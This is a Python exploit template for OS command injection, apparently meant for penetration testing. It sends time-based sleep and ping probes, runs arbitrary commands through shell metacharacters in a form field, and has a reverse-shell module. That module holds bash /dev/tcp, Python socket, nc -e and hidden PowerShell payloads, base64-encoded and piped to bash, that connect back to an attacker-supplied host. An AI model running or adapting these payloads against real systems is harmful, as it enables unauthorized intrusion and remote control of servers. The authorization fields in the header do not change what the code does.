#!/usr/bin/env python3
"""
Command Injection Exploit Template
Target: [Application/Endpoint]
Vulnerability: OS Command Injection
Author: [Your Name]
Date: [Date]
Authorization: [Reference]

Usage:
    python3 cmdi-template.py <target_url> [options]

Options:
    --check         Verify target is vulnerable (safe)
    --cmd           Execute specific command
    --reverse-shell Attempt reverse shell connection
    --dry-run       Show what would be done without executing
"""

import argparse
import requests
import sys
import base64
import time
from typing import Optional


class CommandInjectionExploit:
    """Command Injection Exploit Class"""

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Research)',
        })
        self.os_type = None  # 'linux' or 'windows'

    def log(self, message: str) -> None:
        """Print verbose output"""
        if self.verbose:
            print(f"[*] {message}")

    def check(self) -> bool:
        """
        Verify target is vulnerable using time-based detection
        Safe check - uses sleep/ping for detection
        """
        print("[*] Checking if target is vulnerable...")

        # Linux time-based payloads
        linux_payloads = [
            "; sleep 3",
            "| sleep 3",
            "|| sleep 3",
            "`sleep 3`",
            "$(sleep 3)",
            "; sleep 3 #",
            "| sleep 3 #",
        ]

        # Windows time-based payloads
        windows_payloads = [
            "& ping -n 4 127.0.0.1",
            "| ping -n 4 127.0.0.1",
            "|| ping -n 4 127.0.0.1",
            "& timeout 3",
        ]

        # Test Linux payloads
        for payload in linux_payloads:
            try:
                start = time.time()
                self._inject(payload)
                elapsed = time.time() - start

                if elapsed >= 2.5:
                    print(f"[+] Target is vulnerable! (Linux, {elapsed:.2f}s)")
                    self.os_type = 'linux'
                    return True
            except Exception as e:
                self.log(f"Payload failed: {e}")

        # Test Windows payloads
        for payload in windows_payloads:
            try:
                start = time.time()
                self._inject(payload)
                elapsed = time.time() - start

                if elapsed >= 2.5:
                    print(f"[+] Target is vulnerable! (Windows, {elapsed:.2f}s)")
                    self.os_type = 'windows'
                    return True
            except Exception as e:
                self.log(f"Payload failed: {e}")

        print("[-] Target does not appear vulnerable")
        return False

    def _inject(self, payload: str) -> requests.Response:
        """
        Inject payload into vulnerable parameter
        Modify this method based on injection point
        """
        # TODO: Customize for your target
        # Example: POST parameter injection
        data = {
            'filename': payload,  # Vulnerable parameter
        }

        response = self.session.post(
            f"{self.target}/vulnerable/endpoint",
            data=data,
            timeout=10
        )
        return response

    def execute_command(self, cmd: str) -> Optional[str]:
        """
        Execute arbitrary command and return output
        """
        print(f"[*] Executing: {cmd}")

        if self.os_type == 'linux':
            # Try to get output via different methods
            payloads = [
                f"; {cmd}",
                f"| {cmd}",
                f"`{cmd}`",
                f"$({cmd})",
            ]
        else:  # Windows
            payloads = [
                f"& {cmd}",
                f"| {cmd}",
            ]

        for payload in payloads:
            try:
                response = self._inject(payload)
                # TODO: Extract command output from response
                # This depends on how the application returns data
                if response.status_code == 200:
                    return response.text
            except Exception as e:
                self.log(f"Command execution failed: {e}")

        return None

    def get_reverse_shell(self, lhost: str, lport: int) -> bool:
        """
        Attempt to establish reverse shell connection
        WARNING: Only use with authorization!
        """
        print(f"[*] Attempting reverse shell to {lhost}:{lport}")
        print("[!] Make sure you have a listener: nc -lvnp {lport}")

        if self.os_type == 'linux':
            shells = [
                f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
                f"nc -e /bin/bash {lhost} {lport}",
            ]
        else:  # Windows
            shells = [
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});",
            ]

        input("[?] Press Enter to send reverse shell payload...")

        for shell in shells:
            try:
                # Base64 encode to avoid bad characters
                if self.os_type == 'linux':
                    encoded = base64.b64encode(shell.encode()).decode()
                    payload = f"; echo {encoded} | base64 -d | bash"
                else:
                    payload = f"& {shell}"

                self._inject(payload)
                print("[*] Payload sent. Check your listener.")
                return True
            except Exception as e:
                self.log(f"Reverse shell failed: {e}")

        return False

    def exploit(self, cmd: Optional[str] = None) -> bool:
        """
        Main exploitation flow
        """
        print("[*] Starting command injection exploitation...")

        # Step 1: Verify vulnerability
        if not self.check():
            print("[-] Exploitation aborted - target not confirmed vulnerable")
            return False

        # Step 2: Fingerprint system
        if self.os_type == 'linux':
            self.execute_command("id")
            self.execute_command("uname -a")
        else:
            self.execute_command("whoami")
            self.execute_command("systeminfo | findstr /B /C:\"OS\"")

        # Step 3: Execute custom command if provided
        if cmd:
            output = self.execute_command(cmd)
            if output:
                print(f"[+] Output:\n{output}")

        return True


def main():
    parser = argparse.ArgumentParser(
        description='Command Injection Exploit - Security Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    %(prog)s https://target.com --check
    %(prog)s https://target.com --cmd "id"
    %(prog)s https://target.com --reverse-shell --lhost 10.0.0.1 --lport 4444
        """
    )

    parser.add_argument('target', help='Target URL')
    parser.add_argument('--check', action='store_true',
                        help='Check if target is vulnerable (safe)')
    parser.add_argument('--cmd', help='Command to execute')
    parser.add_argument('--reverse-shell', action='store_true',
                        help='Attempt reverse shell')
    parser.add_argument('--lhost', help='Local host for reverse shell')
    parser.add_argument('--lport', type=int, help='Local port for reverse shell')
    parser.add_argument('--dry-run', action='store_true',
                        help='Show actions without executing')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    if args.dry_run:
        print("[DRY RUN] Would execute against:", args.target)
        return 0

    exploit = CommandInjectionExploit(args.target, verbose=args.verbose)

    if args.check:
        return 0 if exploit.check() else 1
    elif args.reverse_shell:
        if not args.lhost or not args.lport:
            print("[-] Please specify --lhost and --lport for reverse shell")
            return 1
        return 0 if exploit.get_reverse_shell(args.lhost, args.lport) else 1
    elif args.cmd:
        output = exploit.execute_command(args.cmd)
        return 0 if output else 1
    else:
        return 0 if exploit.exploit(args.cmd) else 1


if __name__ == '__main__':
    sys.exit(main())
